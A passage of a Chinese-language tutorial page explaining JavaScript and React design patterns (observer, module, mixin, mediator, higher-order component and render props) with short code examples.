的纯函数，而容器组件则负责应用程序的状态和数据。这使得强制实施关注点分离变得容易。</p><p>展示组件很容易实现可重用，因为它们只是<em>显示</em>数据而不改变这些数据。我们可以在整个应用程序中出于不同目的重用演示组件。</p><p>由于表示组件不会改变应用程序逻辑，因此不了解代码库的人（例如设计人员）可以轻松更改表示组件的外观。如果演示组件在应用程序的许多部分被重用，则更改可以在整个应用程序中保持一致。</p><p>测试演示组件很容易，因为它们通常是纯函数。我们知道组件将根据我们传递的数据呈现什么，而无需模拟数据存储。</p><h3 id="6、观察者模式：当事件发生时使用可观察量通知订阅者"><a href="#6、观察者模式：当事件发生时使用可观察量通知订阅者" class="headerlink" title="6、观察者模式：当事件发生时使用可观察量通知订阅者"></a>6、观察者模式：当事件发生时使用可观察量通知订阅者</h3><p>一个可观察对象通常包含 3 个重要部分：</p><ul><li><code>observers</code>：一组观察者，每当特定事件发生时就会收到通知</li><li><code>subscribe()</code>：将观察者添加到观察者列表的方法</li><li><code>unsubscribe()</code>：从观察者列表中删除观察者的方法</li><li><code>notify()</code>：每当特定事件发生时通知所有观察者的方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Observable</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span> = [];<br>  &#125;<br><br>  <span class="hljs-title function_">subscribe</span>(<span class="hljs-params">f</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span>.<span class="hljs-title function_">push</span>(f);<br>  &#125;<br><br>  <span class="hljs-title function_">unsubscribe</span>(<span class="hljs-params">f</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">subscriber</span> =&gt;</span> subscriber !== f);<br>  &#125;<br><br>  <span class="hljs-title function_">notify</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">observer</span> =&gt;</span> <span class="hljs-title function_">observer</span>(data));<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observable</span>();<br></code></pre></td></tr></table></figure><p><strong>尽管我们可以通过多种方式使用观察者模式，但它在处理异步、基于事件的数据</strong>时非常有用。也许您希望每当某些数据下载完成时，或者每当用户向留言板发送新消息时，某些组件都会收到通知，并且所有其他成员都应该收到通知。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Switch</span>, <span class="hljs-title class_">FormControlLabel</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;@material-ui/core&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ToastContainer</span>, toast &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react-toastify&quot;</span>;<br><span class="hljs-keyword">import</span> observable <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./Observable&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) &#123;<br>  observable.<span class="hljs-title function_">notify</span>(<span class="hljs-string">&quot;User clicked button!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleToggle</span>(<span class="hljs-params"></span>) &#123;<br>  observable.<span class="hljs-title function_">notify</span>(<span class="hljs-string">&quot;User toggled switch!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logger</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span> <span class="hljs-subst">$&#123;data&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">toastify</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-title function_">toast</span>(data, &#123;<br>    <span class="hljs-attr">position</span>: toast.<span class="hljs-property">POSITION</span>.<span class="hljs-property">BOTTOM_RIGHT</span>,<br>    <span class="hljs-attr">closeButton</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">autoClose</span>: <span class="hljs-number">2000</span><br>  &#125;);<br>&#125;<br><br>observable.<span class="hljs-title function_">subscribe</span>(logger);<br>observable.<span class="hljs-title function_">subscribe</span>(toastify);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">&quot;contained&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span></span><br><span class="language-xml">        Click me!</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FormControlLabel</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">control</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Switch</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleToggle&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">        label=&quot;Toggle me!&quot;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ToastContainer</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>使用可观察模式的流行库是 RxJS。</p><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><p>使用观察者模式是强制关注点分离和单一职责原则的好方法。观察者对象与可观察对象并不紧密耦合，并且可以随时解耦合。可观察对象负责监视事件，而观察者只处理接收到的数据。</p><h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><p>如果观察者变得过于复杂，则在通知所有订阅者时可能会导致性能问题。</p><h3 id="7、模块模式：将您的代码分割成更小的、可重用的部分"><a href="#7、模块模式：将您的代码分割成更小的、可重用的部分" class="headerlink" title="7、模块模式：将您的代码分割成更小的、可重用的部分"></a>7、模块模式：将您的代码分割成更小的、可重用的部分</h3><p>import &#x2F; export &#x2F; export default &#x2F; as</p><h4 id="动态导入"><a href="#动态导入" class="headerlink" title="动态导入"></a>动态导入</h4><p>当导入文件顶部的所有模块时，所有模块都会先于文件的其余部分加载。在某些情况下，我们只需要根据某种条件导入一个模块。通过<strong>动态导入</strong>，我们可以按需导入模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">import</span>(<span class="hljs-string">&quot;module&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">default</span>();<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">namedExport</span>();<br>&#125;);<br> <br><span class="hljs-comment">// Or with async/await</span><br>(<span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">import</span>(<span class="hljs-string">&quot;module&quot;</span>);<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">default</span>();<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">namedExport</span>();<br>&#125;)();<br></code></pre></td></tr></table></figure><p>通过动态导入模块，我们可以减少页面加载时间。我们只需要在用户需要的<em>时候</em>加载、解析和编译用户真正需要的代码。</p><h3 id="8、混合模式：向对象或类添加功能而无需继承"><a href="#8、混合模式：向对象或类添加功能而无需继承" class="headerlink" title="8、混合模式：向对象或类添加功能而无需继承"></a>8、混合模式：向对象或类添加功能而无需继承</h3><p>mixin是一个对象，我们可以使用它向另一个对象或类添加可重用的功能，而无需使用继承<strong>。</strong>我们不能单独使用 mixin：它们的唯一目的是在没有继承的情况下向对象或类<em>添加功能</em>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">const</span> dogFunctionality = &#123;<br>  <span class="hljs-attr">bark</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Woof!&quot;</span>),<br>  <span class="hljs-attr">wagTail</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wagging my tail!&quot;</span>),<br>  <span class="hljs-attr">play</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Playing!&quot;</span>),<br>&#125;;<br> <br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, dogFunctionality);<br></code></pre></td></tr></table></figure><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><p>并不推荐，在引入 ES6 类之前，Mixin 通常用于向 React 组件添加功能。React 团队<a href="https://reactjs.org/blog/2016/07/13/mixins-considered-harmful.html">不鼓励使用 mixins</a>，因为它很容易给组件增加不必要的复杂性，使其难以维护和重用。React 团队<a href="https://medium.com/@dan_abramov/mixins-are-dead-long-live-higher-order-components-94a0d2f9e750">鼓励使用更高阶的组件</a>，这些组件现在通常可以被 Hook 取代。</p><p>修改对象的原型被认为是不好的做法，因为它可能导致原型污染以及函数起源的一定程度的不确定性。</p><h3 id="9、中介者-x2F-中间件模式：使用中央中介对象来处理组件之间的通信"><a href="#9、中介者-x2F-中间件模式：使用中央中介对象来处理组件之间的通信" class="headerlink" title="9、中介者&#x2F;中间件模式：使用中央中介对象来处理组件之间的通信"></a>9、中介者&#x2F;中间件模式：使用中央中介对象来处理组件之间的通信</h3><p>对象的请求由调解器处理，而不是让每个对象直接与其他对象通信，从而形成多对多关系。中介器处理该请求，并将其转发到需要的位置。</p><p><img src="https://www.patterns.dev/_next/image?url=https://res.cloudinary.com/ddxwdqwkr/image/upload/f_auto/v1609056523/patterns.dev/Screen_Shot_2020-12-23_at_11.23.32_PM_wjft0a.png&w=3840&q=75" alt="流动"></p><p>调解者模式的一个很好的用例是聊天室！聊天室中的用户不会直接相互交谈。相反，聊天室充当用户之间的中介。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatRoom</span> &#123;<br>  <span class="hljs-title function_">logMessage</span>(<span class="hljs-params">user, message</span>) &#123;<br>    <span class="hljs-keyword">const</span> time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>    <span class="hljs-keyword">const</span> sender = user.<span class="hljs-title function_">getName</span>();<br> <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;time&#125;</span> [<span class="hljs-subst">$&#123;sender&#125;</span>]: <span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, chatroom</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chatroom</span> = chatroom;<br>  &#125;<br> <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">send</span>(<span class="hljs-params">message</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chatroom</span>.<span class="hljs-title function_">logMessage</span>(<span class="hljs-variable language_">this</span>, message);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p><a href="https://expressjs.com/">Express.js</a>是一种流行的 Web 应用程序服务器框架。我们可以向用户可以访问的某些路由添加回调。</p><p>假设如果用户点击 root ，我们希望向请求添加一个标头<code>&#39;/&#39;</code>。我们可以在中间件回调中添加此标头。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> app = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>)();<br> <br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">headers</span>[<span class="hljs-string">&quot;test-header&quot;</span>] = <span class="hljs-number">1234</span>;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p>中间件模式让所有通信都流经一个中心点，使我们能够轻松简化对象之间的多对多关系。</p><h3 id="10、HOC模式：将可重用逻辑作为-props-传递给整个应用程序的组件"><a href="#10、HOC模式：将可重用逻辑作为-props-传递给整个应用程序的组件" class="headerlink" title="10、HOC模式：将可重用逻辑作为 props 传递给整个应用程序的组件"></a>10、HOC模式：将可重用逻辑作为 props 传递给整个应用程序的组件</h3><p>高阶组件 (HOC) 是接收另一个组件的组件。HOC 包含我们想要应用于作为参数传递的组件的某些逻辑。应用该逻辑后，HOC 返回具有附加逻辑的元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withStyles</span>(<span class="hljs-params">Component</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">props</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> style = &#123; <span class="hljs-attr">padding</span>: <span class="hljs-string">&#x27;0.2rem&#x27;</span>, <span class="hljs-attr">margin</span>: <span class="hljs-string">&#x27;1rem&#x27;</span> &#125;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span><br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Button</span> = () = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">Text</span> = (<span class="hljs-params"></span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello World!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br> <br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StyledButton</span> = <span class="hljs-title function_">withStyles</span>(<span class="hljs-title class_">Button</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StyledText</span> = <span class="hljs-title function_">withStyles</span>(<span class="hljs-title class_">Text</span>)<br></code></pre></td></tr></table></figure><h4 id="hooks方案"><a href="#hooks方案" class="headerlink" title="hooks方案"></a>hooks方案</h4><p>在某些情况下，我们可以用 React Hooks 替换 HOC 模式。</p><p>正如 React 文档告诉我们的，使用 Hooks 可以减少组件树的深度。使用 HOC 模式，很容易得到深度嵌套的组件树。</p><p>使用高阶组件可以为许多组件提供相同的逻辑，同时将该逻辑全部保留在一个位置。钩子允许我们从组件内部添加自定义行为，如果多个组件依赖于此行为，则与 HOC 模式相比，这可能会增加引入错误的风险。</p><p><strong>HOC 的最佳用例</strong>：</p><ul><li>整个应用程序中的许多组件需要使用相同<em>的、未定制的行为。</em></li><li>该组件可以独立工作，无需添加自定义逻辑。</li></ul><p><strong>Hooks 的最佳用例</strong>：</p><ul><li>必须为使用它的每个组件定制该行为。</li><li>该行为不会传播到整个应用程序，只有一个或几个组件使用该行为。</li><li>该行为向组件添加了许多属性</li></ul><h4 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h4><p>使用高阶组件模式允许我们将想要重用的逻辑保留在一个地方。这降低了通过一遍又一遍地复制代码而在整个应用程序中意外传播错误的风险，每次都可能引入新的错误。通过将逻辑全部保留在一处，我们可以保留代码<code>DRY</code>并轻松实施关注点分离。</p><h4 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h4><p>HOC 可以传递给元素的 prop 的名称可能会导致命名冲突。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withStyles</span>(<span class="hljs-params">Component</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">props</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> style = &#123;<br>      <span class="hljs-attr">padding</span>: <span class="hljs-string">&#x27;0.2rem&#x27;</span>,<br>      <span class="hljs-attr">margin</span>: <span class="hljs-string">&#x27;1rem&#x27;</span>,<br>      ...props.<span class="hljs-property">style</span><br>    &#125;<br> <br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span><br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Button</span> = () = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">color:</span> &#x27;<span class="hljs-attr">red</span>&#x27; &#125;&#125;&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StyledButton</span> = <span class="hljs-title function_">withStyles</span>(<span class="hljs-title class_">Button</span>)<br></code></pre></td></tr></table></figure><p>当使用多个组合HOC 并将 props 传递给包含在其中的元素时，很难确定哪个 HOC 负责哪个 prop。这可能会阻碍应用程序的调试和扩展。</p><h3 id="11、渲染道具模式：通过-props-将-JSX-元素传递给组件"><a href="#11、渲染道具模式：通过-props-将-JSX-元素传递给组件" class="headerlink" title="11、渲染道具模式：通过 props 将 JSX 元素传递给组件"></a>11、渲染道具模式：通过 props 将 JSX 元素传递给组件</h3><p><a href="https://www.patterns.dev/posts/hoc-pattern">在高阶组件</a>部分中，我们看到，如果多个组件需要访问相同的数据或包含相同的逻辑，那么能够重用组件逻辑会非常方便。</p><p>使组件非常可重用的另一种方法是使用<strong>render prop</strong>模式。render prop 是组件上的 prop，其值是返回 JSX 元素的函数。除了 render prop 之外，组件本身不会渲染任何内容。相反，该组件只是调用 render prop，而不是实现自己的渲染逻辑。</p><p>想象一下我们有一个<code>Title</code>组件。在这种情况下，<code>Title</code>除了呈现我们传递的值之外，组件不应该执行任何操作。我们可以为此使用渲染道具！<code>Title</code>让我们将希望组件渲染的值传递给<code>render</code>prop。</p><p>想象一下我们有一个<code>Title</code>组件。在这种情况下，<code>Title</code>除了呈现我们传递的值之外，组件不应该执行任何操作。我们可以为此使用渲染道具！<code>Title</code>让我们将希望组件渲染的值传递给<code>render</code>prop。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Title</span> render=&#123;<span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>I am a render prop!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>&#125; /&gt;<br></code></pre></td></tr></table></figure><p>在组件内<code>Title</code>，我们可以通过返回调用的<code>render</code>prop 来渲染这些数据！</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Title</span> = (<span class="hljs-params">props</span>) =&gt; props.<span class="hljs-title function_">render</span>();<br></code></pre></td></tr></table></figure><p>对于该<code>Component</code>元素，我们必须传递一个名为 的 prop <code>render</code>，它是一个返回 React 元素的函数。</p><p>接受 render prop 的组件通常不仅仅只是调用<code>render</code>prop。相反，我们通常希望将数据从采用 render prop 的组件传递到我们作为 render prop 传递的元素！</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> data = &#123; ... &#125;<br> <br>  <span class="hljs-keyword">return</span> props.<span class="hljs-title function_">render</span>(data)<br>&#125;<br></code></pre></td></tr></table></figure><p>render prop 现在可以接收我们作为参数传递的值。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Component</span> render=&#123;<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>&#125;<br></code></pre></td></tr></table></figure><h4 id="children作为函数"><a href="#children作为函数" class="headerlink" title="children作为函数"></a>children作为函数</h4><p>除了常规的 JSX 组件之外，我们还可以将函数作为子组件传递给 React 组件。我们可以通过<code>children</code>prop 来使用此功能，从技术上讲，它也是一个 render prop。</p><p>让我们改变一下<code>Input</code>组件。我们不会显式传递<code>render</code>prop，而是只传递一个函数作为组件的子组件<code>Input</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>☃️ Temperature Converter 🌞<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Input</span>&gt;</span></span><br><span class="language-xml">        &#123;(value) =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Kelvin</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Fahrenheit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Input</span>&gt;</span></span><br>    &lt;/div&gt;<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><code>props.children</code>我们可以通过组件上可用的 prop访问此函数<code>Input</code>。<code>props.render</code>我们将使用用户输入的值进行调用，而不是<code>props.children</code>使用用户输入的值进行调用。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Input</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&quot;&quot;</span>);<br> <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span 